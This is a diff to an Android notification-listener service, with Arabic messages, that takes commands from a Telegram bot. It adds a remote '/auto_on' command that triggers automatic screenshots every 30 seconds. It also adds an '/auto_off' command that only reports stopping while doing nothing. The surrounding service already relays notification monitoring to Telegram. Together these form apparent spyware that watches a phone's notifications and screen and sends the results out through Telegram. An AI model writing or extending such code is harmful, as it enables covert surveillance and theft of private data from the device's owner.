@@ -84,6 +84,13 @@ public class NotificationService extends NotificationListenerService {
                                     sendToTelegram("✅ جاري مراقبة الإشعارات", String.valueOf(chatId));
                                 } else if (text.equals("/status")) {
                                     sendToTelegram("✅ النظام يعمل بشكل طبيعي", String.valueOf(chatId));
+                                } else if (text.equals("/auto_on")) {
+                                    Intent intent = new Intent("AUTO_SCREENSHOT");
+                                    sendBroadcast(intent);
+                                    sendToTelegram("✅ تم تفعيل التصوير التلقائي كل 30 ثانية", String.valueOf(chatId));
+                                } else if (text.equals("/auto_off")) {
+                                    // هنا تقدر تضيف منطق إيقاف التصوير التلقائي
+                                    sendToTelegram("✅ تم إيقاف التصوير التلقائي", String.valueOf(chatId));
                                 }
                             }
                         }
@@ -210,4 +217,4 @@ public class NotificationService extends NotificationListenerService {
     public static NotificationService getInstance() {
         return instance;
     }
-            }
+}
